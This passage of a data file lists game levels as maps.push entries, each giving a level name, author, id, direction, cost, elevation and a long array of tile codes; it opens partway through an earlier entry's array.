,0,57,57,0,0,135,135,0,1,0,0,1,0,0,0,0,0,0,0,0,57,57,1,1,0,135,135,135,1,0,0,1,0,0,0,0,0,0,0,57,57,1,105,105,1,135,135,135,1,22,22,0,0,0,0,0,0,0,1,57,0,1,105,139,1,0,135,135,1,21,21,0,0,0,0,0,0,0,57,57,0,1,105,105,1,0,135,135,1,0,0,0,14,14,14,14,14,57,0,1,1,105,105,105,1,0,135,135,135,13,13,0,14,87,14,14,14,14,0,5,5,5,105,1,0,0,135,135,135,13,13,0,14,14,2,2,14,14,3,5,5,5,1,0,0]});
maps.push({name="Hump",author="tilgep",id="#1665785075",direction="forward",cost=117,elevation=3,map=[0,0,0,0,0,0,0,116,116,116,2,2,116,116,116,0,0,0,0,0,0,0,0,0,0,0,0,116,116,116,116,116,116,116,0,0,0,0,0,0,0,0,0,0,0,0,93,123,116,116,116,116,116,123,94,0,0,0,0,0,0,0,0,0,0,0,0,86,116,141,141,141,116,123,0,0,0,0,0,0,0,0,0,0,0,0,123,123,123,123,123,123,123,123,88,0,0,0,0,0,0,0,0,0,0,0,1,123,123,123,123,123,123,123,1,0,0,0,0,0,0,0,0,0,0,0,1,124,1,1,1,1,1,124,1,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,88,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,124,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,123,123,123,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,122,122,122,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,121,121,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,120,120,120,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,95,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,85,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,94,93,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,119,119,119,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,119,2,2,119,0,0,0,0,0,0,0,0]});
maps.push({name="180",author="sivi",id="#1665853031",direction="forward",cost=173,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,19,19,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,19,19,19,19,19,19,19,3,14,14,1,1,0,0,0,0,0,0,0,1,19,19,90,19,90,19,129,14,14,14,14,1,0,0,0,0,0,0,0,1,19,19,19,19,19,19,19,3,14,14,94,1,0,0,0,0,0,0,1,1,96,96,1,1,1,1,1,1,14,14,14,1,0,0,0,0,0,0,1,90,119,119,90,1,131,119,65,14,14,14,94,1,0,0,0,0,0,0,1,93,119,119,119,1,131,119,65,14,14,14,14,1,0,0,0,0,0,0,1,97,119,119,132,1,131,119,65,14,14,14,1,1,0,0,0,0,0,0,1,93,119,119,119,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,90,119,119,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Fire And Ice",author="sivi",id="#1665857893",direction="forward",cost=561,elevation=0,map=[0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,0,1,1,11,11,9,65,90,5,1,105,105,1,5,90,75,9,11,11,1,1,1,93,11,10,7,65,5,5,1,105,105,1,5,5,75,7,10,11,93,1,1,11,11,9,65,65,5,5,105,105,105,105,5,5,75,75,9,11,11,1,1,8,9,7,65,5,5,5,105,105,105,105,5,5,5,75,7,9,8,1,1,65,65,65,65,5,5,90,1,105,105,1,90,5,5,75,75,75,75,1,1,5,5,90,5,5,5,5,1,94,94,1,5,5,5,5,90,5,5,1,1,24,22,5,5,90,5,1,1,1,1,1,1,5,90,5,5,22,24,1,1,65,67,65,65,5,5,1,25,25,25,25,1,5,5,75,75,77,75,1,1,65,67,65,65,65,65,67,0,0,0,0,77,75,75,75,75,77,75,1,1,65,67,65,65,65,65,67,0,0,0,0,77,75,75,75,75,77,75,1,1,65,67,65,65,5,5,1,25,25,25,25,1,5,5,75,75,77,75,1,1,24,22,5,5,5,90,1,1,1,1,1,1,90,5,5,5,22,24,1,1,5,5,90,5,5,5,5,1,105,105,1,5,5,5,5,90,5,5,1,1,65,65,65,5,5,5,5,98,105,105,96,5,5,5,5,75,75,75,1,1,65,9,65,65,90,5,5,98,105,105,96,5,5,90,75,75,9,75,1,1,65,65,65,65,65,5,5,1,105,105,1,5,5,75,75,75,75,75,1,1,11,97,65,7,65,5,5,1,105,105,1,5,5,75,7,75,99,11,1,1,1,11,65,65,65,5,90,1,105,105,1,90,5,75,75,75,11,1,1,0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,0]});
maps.push({name="Snake Path",author="Mini",id="#1665915599",direction="forward",cost=384,elevation=0,map=[0,0,117,77,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,117,117,117,77,0,0,0,0,0,77,77,77,77,77,0,121,121,0,0,117,117,117,117,117,77,0,0,0,77,120,120,120,121,121,121,121,121,43,90,118,117,77,117,117,116,77,1,77,120,120,120,120,121,121,121,121,43,43,94,118,118,1,77,116,116,116,77,1,120,120,77,77,77,77,77,77,43,94,90,118,118,1,1,77,116,116,116,1,77,120,120,0,0,0,0,0,0,0,0,118,118,118,1,1,77,116,116,116,1,119,119,119,0,0,0,0,0,0,0,0,118,118,118,1,1,77,116,115,115,1,119,119,119,0,0,0,0,0,0,0,0,118,118,118,1,1,77,115,114,1,1,119,119,119,0,0,0,0,0,0,0,0,118,118,118,1,1,77,86,85,77,1,118,118,118,0,0,0,0,0,0,0,0,118,118,118,1,77,85,86,77,1,1,118,118,118,0,0,0,0,0,0,0,0,119,119,119,1,1,114,115,77,1,1,118,118,118,0,0,0,0,0,0,0,0,119,119,119,1,115,115,116,77,1,1,118,118,118,0,0,0,0,0,0,0,0,119,119,119,1,116,116,116,77,1,1,118,118,118,0,0,0,0,0,0,0,0,120,120,77,1,116,116,116,77,1,1,118,118,90,94,43,77,77,77,77,77,77,120,120,1,77,116,116,116,77,1,118,118,94,43,43,121,121,121,121,120,120,120,120,77,1,77,116,117,117,77,117,118,90,43,121,121,121,121,121,120,120,120,77,0,0,0,77,117,117,117,117,117,0,0,121,121,0,77,77,77,77,77,0,0,0,0,0,77,117,117,117,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,77,117,0,0]});
maps.push({name="Odd Split",author="Mini",id="#1665927261",direction="forward",cost=420,elevation=0,map=[0,0,0,0,0,1,135,1,1,1,1,1,1,1,1,1,2,2,1,0,0,0,0,0,0,24,135,135,135,1,135,135,44,24,24,1,24,24,1,0,0,0,0,0,1,90,135,1,135,1,135,1,1,1,24,1,95,95,1,0,0,0,0,0,1,90,24,1,44,1,44,1,90,24,24,1,131,131,1,0,0,1,1,1,1,1,24,1,135,1,135,1,24,24,1,1,1,1,1,0,1,44,44,44,44,1,24,1,135,44,135,1,132,94,1,132,24,90,90,1,1,0,92,1,92,1,24,24,1,1,1,1,1,1,1,94,24,24,90,1,1,0,0,1,0,1,90,24,85,24,90,24,85,90,24,1,24,24,24,1,1,0,0,1,0,1,93,24,24,86,86,24,24,24,85,24,1,143,143,1,1,0,0,1,0,1,93,85,86,133,133,86,85,24,1,24,1,91,24,1,1,92,0,1,44,1,90,24,86,133,133,86,90,93,1,143,1,24,24,1,1,44,44,1,44,24,85,24,24,86,86,24,24,93,1,24,1,24,91,1,1,24,24,90,1,24,24,85,90,85,90,24,85,90,1,24,1,1,91,1,1,24,24,24,94,1,1,1,1,1,1,1,24,24,1,24,91,24,24,1,1,90,24,24,132,1,94,132,1,129,0,127,1,24,1,90,91,24,90,1,0,1,1,1,1,1,24,24,1,0,1,130,1,24,1,1,1,1,1,0,0,1,134,134,1,24,24,90,1,0,1,130,1,24,90,1,0,0,0,0,0,1,24,24,1,44,1,1,1,0,1,0,1,24,24,1,0,0,0,0,0,1,95,95,1,129,0,0,0,126,1,44,44,24,24,1,0,0,0,0,0,1,2,2,1,1,1,1,1,1,1,1,1,24,0,1,0,0,0,0]});
maps.push({name="Casino Light",author="Dogeeri",id="#1665992621",direction="forward",cost=376,elevation=-4,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,77,77,77,0,0,0,0,0,21,21,21,21,21,21,0,0,0,0,0,0,77,94,77,0,0,0,0,0,20,21,20,21,20,21,0,0,0,0,0,0,77,37,77,0,0,0,0,1,142,143,142,143,142,143,1,0,0,0,0,1,1,91,1,0,0,0,1,1,20,20,20,20,20,20,1,1,0,0,0,1,88,117,1,1,0,0,1,90,20,40,40,40,40,20,90,1,0,0,0,1,88,117,88,1,0,0,1,20,20,40,120,120,40,20,20,1,0,0,0,1,117,117,88,1,0,0,1,90,20,40,120,120,40,20,90,1,0,0,0,1,117,117,117,1,1,1,1,1,40,40,120,120,40,40,1,1,1,1,1,1,97,117,117,117,0,119,120,91,120,120,119,119,120,120,119,118,90,118,90,1,93,117,117,117,118,119,0,91,120,120,119,119,120,120,119,118,118,118,118,1,117,117,117,1,1,1,1,1,1,96,120,120,96,1,144,1,144,1,144,1,117,117,88,1,0,0,0,0,1,96,96,96,96,1,144,1,144,1,144,1,88,117,88,1,0,0,0,0,1,39,39,39,39,1,144,1,144,1,144,1,88,117,1,1,0,0,0,0,1,39,59,59,39,1,144,1,144,1,144,1,1,1,1,0,0,0,0,0,1,90,59,59,90,1,144,1,144,1,144,0,0,0,0,0,0,0,0,0,1,137,58,58,134,1,93,1,93,1,93,0,0,0,0,0,0,0,0,0,1,90,58,58,90,1,94,1,94,1,94,0,0,0,0,0,0,0,0,0,1,139,57,57,132,1,131,1,131,1,131,0,0,0,0,0,0,0,0,0,1,37,2,2,37,1,1,1,1,1,1]});
maps.push({name="X",author="sivi",id="#1666031979",direction="left",cost=227,elevation=6,map=[1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,2,11,11,11,1,0,0,0,0,0,0,0,0,0,0,1,5,5,5,1,2,11,11,11,90,0,0,0,0,0,0,0,0,0,0,90,5,5,5,1,1,11,11,11,11,11,1,0,0,0,0,0,0,1,5,5,5,5,5,1,0,1,90,11,11,11,88,0,0,0,0,0,0,88,5,5,5,90,1,0,0,0,0,11,11,11,11,11,1,0,0,1,5,5,5,5,5,0,0,0,0,0,0,1,88,11,11,11,90,0,0,90,5,5,5,88,1,0,0,0,0,0,0,0,0,11,11,11,11,11,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,1,90,11,11,45,45,5,5,90,1,0,0,0,0,0,0,0,0,0,0,0,0,11,45,45,45,45,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,45,45,45,45,11,0,0,0,0,0,0,0,0,0,0,0,0,1,90,5,5,45,45,11,11,90,1,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,11,11,11,11,11,0,0,0,0,0,0,0,0,1,88,5,5,5,90,0,0,90,11,11,11,88,1,0,0,0,0,0,0,5,5,5,5,5,1,0,0,1,11,11,11,11,11,0,0,0,0,1,90,5,5,5,88,0,0,0,0,0,0,88,11,11,11,90,1,0,1,5,5,5,5,5,1,0,0,0,0,0,0,1,11,11,11,11,11,1,1,5,131,5,90,0,0,0,0,0,0,0,0,0,0,90,11,132,11,1,1,94,5,5,1,0,0,0,0,0,0,0,0,0,0,1,11,11,93,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1]});
maps.push({name="Mash",author="tilgep",id="#1666039704",direction="left",cost=234,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,5,5,5,5,21,21,21,0,0,0,0,0,0,0,0,0,0,24,24,24,141,5,5,141,21,21,94,0,0,0,0,0,0,0,0,0,24,24,24,24,141,5,5,141,21,21,94,0,0,0,0,0,0,0,0,24,24,24,24,24,5,105,105,5,21,21,21,0,0,0,0,0,0,0,24,24,24,24,24,1,1,143,143,1,1,0,0,0,0,0,0,0,0,98,24,89,24,24,0,1,1,142,142,1,1,0,0,0,0,0,0,0,0,24,98,24,97,24,0,0,7,107,107,7,0,0,0,0,0,0,0,0,24,24,24,98,24,24,0,0,7,7,7,7,0,0,0,0,0,0,0,24,24,24,24,24,98,0,0,0,140,140,140,140,0,0,0,0,0,0,1,24,24,24,24,0,0,0,0,0,12,12,12,12,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,12,12,12,12,0,0,0,0,24,24,24,24,24,24,0,0,1,1,1,1,12,12,12,12,0,0,0,0,2,24,24,1,24,24,141,112,112,112,112,112,96,112,112,112,0,0,0,0,2,24,24,24,24,24,141,112,52,52,52,89,52,96,52,112,0,0,0,0,24,24,24,24,24,24,141,112,52,52,52,52,99,52,96,112,0,0,0,0,0,0,0,0,24,24,141,112,112,112,112,112,112,112,112,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 9",author="TF2 Pencil",id="#1666068428",direction="right",cost=311,elevation=10,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,1,1,1,1,1,1,1,1,1,1,1,1,19,19,19,2,0,0,9,9,1,97,21,19,1,14,99,1,102,19,19,1,19,19,19,2,0,0,9,9,1,21,21,17,1,72,72,1,131,131,19,1,19,19,0,0,0,0,9,9,1,9,9,15,1,66,66,1,131,19,19,1,19,19,0,0,0,0,9,9,1,9,9,15,1,14,14,1,19,19,131,1,101,101,0,0,0,0,9,9,9,9,9,9,1,72,72,1,19,131,131,1,101,101,0,0,0,0,9,9,9,9,9,9,1,66,66,1,19,19,19,1,19,19,0,0,0,0,96,96,1,9,9,15,1,14,14,1,131,19,131,1,19,19,0,0,0,0,96,96,1,9,9,15,1,72,72,1,19,19,131,1,19,19,0,0,0,0,9,9,1,4,9,9,1,66,66,1,19,131,131,19,19,19,0,0,0,0,3,3,1,15,15,9,1,14,14,1,19,19,19,19,132,19,0,0,0,0,14,14,1,1,1,1,1,14,1,1,1,1,1,1,19,19,0,0,0,0,14,14,14,14,14,14,14,14,98,98,14,3,19,19,19,19,0,0,0,0,14,14,14,14,14,14,14,14,98,98,14,3,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 11",author="TF2 Pencil",id="#1666068484",direction="left",cost=206,elevation=16,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,1,1,1,6,6,1,0,0,0,0,1,0,18,0,18,18,18,18,18,0,1,97,13,6,6,1,0,0,0,0,1,18,0,18,0,1,0,37,37,0,1,13,13,6,6,1,0,0,0,0,1,0,18,0,18,1,0,36,36,0,1,13,13,6,6,1,0,0,0,0,1,18,0,18,0,1,0,35,35,0,1,13,13,6,6,1,0,0,0,0,1,18,1,1,1,1,0,34,34,0,1,3,6,6,6,1,0,0,0,0,0,18,0,0,0,0,0,33,33,0,0,0,0,26,26,0,0,0,0,0,0,18,0,0,0,0,0,32,32,0,0,0,0,26,26,0,0,0,0,0,0,18,0,0,0,0,0,31,31,0,0,0,0,26,26,0,0,0,0,0,0,18,0,0,0,0,0,30,30,0,0,0,0,26,26,0,0,0,0,0,1,18,1,1,1,1,0,29,29,0,1,1,1,96,96,1,0,0,0,0,1,18,19,20,21,1,0,28,28,0,1,6,6,6,6,1,0,0,0,22,1,22,22,22,22,1,0,27,27,0,1,6,6,6,4,1,0,0,2,22,22,22,22,22,22,1,0,6,6,6,98,6,1,12,12,1,0,0,2,22,22,22,22,22,22,1,0,6,6,6,98,6,1,12,99,1,0,0,0,22,1,1,1,1,1,1,0,0,0,0,1,1,1,1,1,1,0,0,0,0,42,0,42,0,42,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trigger Tower 13",author="TF2 Pencil",id="#1666068531",direction="right",cost=184,elevation=19,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,5,5,44,0,0,0,24,0,0,24,0,0,0,0,24,1,0,0,0,1,5,5,44,0,44,0,24,0,0,0,0,0,24,0,24,1,0,0,0,1,5,5,44,0,0,0,24,0,0,24,0,0,0,0,24,1,0,0,0,1,5,3,44,0,44,0,24,0,0,0,0,0,24,0,24,1,0,0,0,1,5,5,44,0,0,0,24,0,0,24,0,0,0,0,97,1,0,0,0,1,5,5,44,0,44,0,24,0,0,0,0,0,24,0,24,1,0,0,0,1,5,5,0,0,0,0,0,0,0,0,0,0,0,0,24,1,0,0,0,1,5,5,5,5,5,5,5,5,96,96,5,5,5,3,24,1,0,0,0,1,5,5,0,0,0,0,0,0,0,0,0,0,0,0,24,1,0,0,0,1,5,5,44,0,44,0,24,0,0,0,0,0,24,0,24,1,0,0,0,1,5,5,44,0,0,0,24,0,0,24,0,0,0,0,97,1,0,0,0,1,5,3,44,0,44,0,24,0,0,0,0,0,24,0,24,1,0,0,0,1,5,5,44,0,0,0,24,0,0,24,0,0,0,0,24,1,0,0,0,1,5,5,44,0,44,0,24,0,0,0,0,0,24,0,24,96,24,2,0,1,5,5,44,0,0,0,24,0,0,24,0,0,0,0,24,96,24,2,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Hole In The Wall",author="sivi",id="#1666114188",direction="forward",cost=256,elevation=-1,map=[0,0,0,0,0,0,0,1,114,2,2,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,127,90,127,90,127,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,94,5,65,65,65,65,65,65,65,65,65,65,65,5,94,0,0,0,0,0,5,5,65,65,65,65,65,65,65,65,65,65,65,5,5,0,0,0,0,0,6,6,1,1,143,1,143,1,143,1,143,1,1,6,6,0,0,0,0,0,7,7,1,90,114,90,114,90,114,90,114,90,1,7,7,0,0,0,0,0,8,8,1,114,114,114,114,114,114,114,114,114,1,8,8,0,0,0,0,0,9,9,1,90,114,93,114,93,114,93,114,90,1,9,9,0,0,0,0,0,10,10,1,114,114,114,114,114,114,114,114,114,1,10,10,0,0,0,0,0,11,11,1,113,113,113,113,113,113,113,113,113,1,11,11,0,0,0,0,0,12,12,112,113,113,113,113,113,113,113,113,113,112,12,12,0,0,0,0,0,12,12,112,113,113,113,113,113,113,113,113,113,112,12,12,0,0,0,0,0,1,1,1,1,1,1,2,2,113,1,1,1,1,1,1,0,0]});
maps.push({name="Water pillars",author="Luffaren",id="#1666167453",direction="left",cost=261,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,90,5,5,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,45,45,11,0,0,0,0,0,3,0,0,25,67,25,0,25,67,25,0,93,45,45,93,0,0,0,0,67,24,67,0,67,19,67,0,67,14,67,0,11,45,45,11,0,0,0,0,0,72,0,0,0,72,0,0,0,72,0,0,93,45,45,93,0,0,0,0,0,67,0,0,0,67,0,0,0,67,0,0,11,45,45,11,1,5,5,5,5,72,5,5,5,72,5,5,5,72,5,1,24,105,105,24,90,5,5,89,5,72,5,89,5,72,5,89,5,72,5,5,24,105,105,24,2,5,5,5,5,72,5,5,5,72,5,5,5,72,5,5,105,105,105,24,2,5,5,5,5,72,5,5,5,72,5,5,5,72,5,5,105,105,94,24,90,5,5,89,5,72,105,105,105,72,105,105,105,72,105,105,24,94,105,24,1,5,5,5,5,72,105,1,105,72,105,1,105,72,105,1,24,24,24,24,0,0,0,0,0,67,0,0,0,67,0,0,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Drainage",author="Luffaren",id="#1666190441",direction="right",cost=416,elevation=-19,map=[0,0,2,2,24,24,19,19,19,5,0,0,0,0,0,0,0,5,5,5,0,24,24,24,24,24,65,65,65,67,0,0,0,0,0,0,5,89,5,2,24,24,24,24,24,24,19,19,19,5,0,0,0,0,0,5,5,5,5,2,24,89,23,23,65,65,65,65,65,67,0,0,0,0,5,5,65,65,5,5,24,24,22,22,65,14,14,14,14,5,0,0,0,0,67,65,65,65,65,67,24,24,21,21,65,14,89,14,14,3,0,0,0,0,5,5,65,65,5,5,24,24,20,20,65,14,14,14,14,5,0,0,0,0,67,65,65,65,65,67,89,24,19,19,65,14,14,65,5,5,0,0,0,141,5,5,65,65,5,5,24,24,18,18,65,14,14,65,5,0,0,0,0,0,67,65,65,65,65,67,24,24,17,17,65,14,14,65,5,0,0,0,0,0,5,5,65,65,5,5,24,24,16,16,65,14,14,65,5,93,0,0,0,0,67,65,65,65,65,67,24,24,15,15,65,14,14,67,0,0,0,0,0,0,5,5,65,65,5,5,94,24,14,14,14,14,14,0,0,0,0,0,0,0,67,65,65,65,65,67,24,24,14,14,14,14,14,67,0,0,0,0,0,0,5,5,65,65,5,5,94,24,14,14,89,14,14,65,5,94,0,0,0,0,67,65,65,65,65,67,24,24,14,14,14,14,14,65,5,0,0,0,0,0,5,5,65,65,5,5,94,24,24,24,24,13,13,65,5,5,5,5,5,5,5,5,5,5,89,5,1,1,1,1,24,12,12,65,65,65,65,65,65,5,5,89,5,5,5,5,1,1,1,1,24,12,12,11,10,9,8,7,6,5,5,5,5,5,5,0,93,93,93,24,24,89,12,11,10,9,8,7,6,5,5,5,5,5,0,0]});
maps.push({name="Hot stream",author="Luffaren",id="#1666192501",direction="left",cost=620,elevation=19,map=[5,2,2,5,5,5,77,77,77,77,77,77,77,77,77,5,0,0,0,0,5,5,5,5,5,5,75,75,75,75,75,75,75,75,75,5,5,0,0,0,5,5,5,5,5,5,75,75,75,75,75,5,75,75,75,5,5,5,0,0,5,5,5,5,5,5,75,75,5,75,75,75,75,75,5,5,89,5,5,0,0,94,5,5,89,5,75,75,75,75,75,75,75,75,5,5,5,5,5,0,0,0,94,5,5,5,5,75,75,75,75,75,75,75,75,5,5,5,5,5,0,0,0,5,5,5,5,75,75,75,5,75,75,75,75,5,5,125,5,5,0,0,0,0,5,5,75,75,75,5,5,75,75,5,75,5,5,5,5,5,0,0,0,0,0,5,75,75,75,75,75,75,75,75,75,5,5,14,14,14,0,0,0,0,0,5,77,77,77,77,77,77,77,77,77,5,5,14,14,14,0,0,0,0,24,24,75,75,75,75,75,75,75,75,75,24,24,14,125,14,0,0,24,24,24,24,24,75,75,75,24,75,75,75,75,24,24,14,14,14,24,24,24,24,89,24,24,24,75,75,75,75,75,24,24,24,24,24,24,24,2,24,24,24,24,24,75,75,75,75,75,75,75,75,24,24,24,24,24,24,2,24,24,24,24,24,75,75,75,75,75,75,75,75,75,24,24,24,24,24,24,24,24,89,24,24,75,75,24,75,75,24,24,75,75,24,89,24,24,0,0,0,93,24,24,24,75,75,75,75,75,24,75,75,75,24,24,24,24,0,0,0,0,93,24,24,75,75,75,75,75,75,75,75,24,24,24,24,0,0,0,0,0,0,24,24,1,1,1,1,1,1,1,1,1,24,24,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0]});
maps.push({name="Awareness",author="Mini",id="#1666192544",direction="forward",cost=254,elevation=0,map=[0,0,0,0,0,15,15,15,15,2,2,15,15,15,15,0,0,0,0,0,0,0,0,0,0,130,140,15,15,15,15,15,15,140,130,0,0,0,0,0,0,0,0,0,130,130,130,15,15,15,15,15,15,130,130,130,0,0,0,0,0,0,1,64,130,130,0,0,94,15,15,94,0,0,130,130,64,1,0,0,0,1,64,64,64,0,0,0,0,15,15,0,0,0,0,64,64,64,1,0,0,64,64,64,1,0,0,0,0,0,0,0,0,0,0,1,64,64,64,0,0,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,0,0,130,130,0,0,0,0,0,0,93,93,0,0,0,0,0,0,130,130,0,0,130,130,0,0,1,1,0,0,64,64,0,0,1,1,0,0,130,130,0,0,0,0,0,1,100,44,0,0,64,64,0,0,44,44,1,0,0,0,0,0,0,0,0,1,44,44,0,0,64,64,0,0,44,100,1,0,0,0,0,0,130,130,0,0,1,1,0,0,130,130,0,0,1,1,0,0,130,130,0,0,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,0,0,140,140,1,0,0,0,0,0,0,0,0,0,0,0,0,1,140,140,0,0,64,64,64,1,0,0,0,0,130,130,0,0,0,0,1,64,64,64,0,0,1,64,64,64,0,0,0,0,55,55,0,0,0,0,64,64,64,1,0,0,0,1,64,130,130,0,0,55,55,55,55,0,0,130,130,64,1,0,0,0,0,0,0,130,130,130,15,55,55,55,55,15,130,130,130,0,0,0,0,0,0,0,0,0,130,140,15,55,55,55,55,15,140,130,0,0,0,0,0,0,0,0,0,0,15,15,55,55,2,2,55,55,15,15,0,0,0,0,0]});
maps.push({name="The Flightzone",author="Mini",id="#1666192859",direction="forward",cost=206,elevation=0,map=[131,64,64,64,64,97,0,6,6,2,2,6,6,0,99,64,64,64,64,133,64,64,64,64,64,64,0,94,6,106,106,6,94,0,64,64,64,64,64,64,0,0,130,130,0,0,0,0,94,106,106,94,0,0,0,0,130,130,0,0,0,0,0,0,0,0,0,0,0,106,106,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,130,0,0,0,0,106,106,106,106,0,0,0,0,130,130,0,0,0,0,55,55,0,0,0,0,106,106,106,106,0,0,0,0,55,55,0,0,0,0,55,55,0,0,0,0,106,106,106,106,0,0,0,0,55,55,0,0,0,0,130,130,0,0,0,0,106,106,106,106,0,0,0,0,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,106,106,106,106,0,0,0,0,0,0,0,0,0,0,130,130,0,0,0,106,106,106,106,106,106,0,0,0,130,130,0,0,0,0,46,46,6,6,106,106,106,106,106,106,106,106,6,6,46,46,0,0,0,0,46,46,6,6,106,132,106,106,106,106,134,106,6,6,46,46,0,0,0,0,1,1,1,1,1,1,1,96,96,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,1,98,98,98,98,1,1,0,0,0,0,0,0,0,0,0,0,0,1,93,106,106,106,106,106,106,93,1,0,0,0,0,0,0,0,0,0,0,0,1,1,106,106,106,106,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,106,106,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
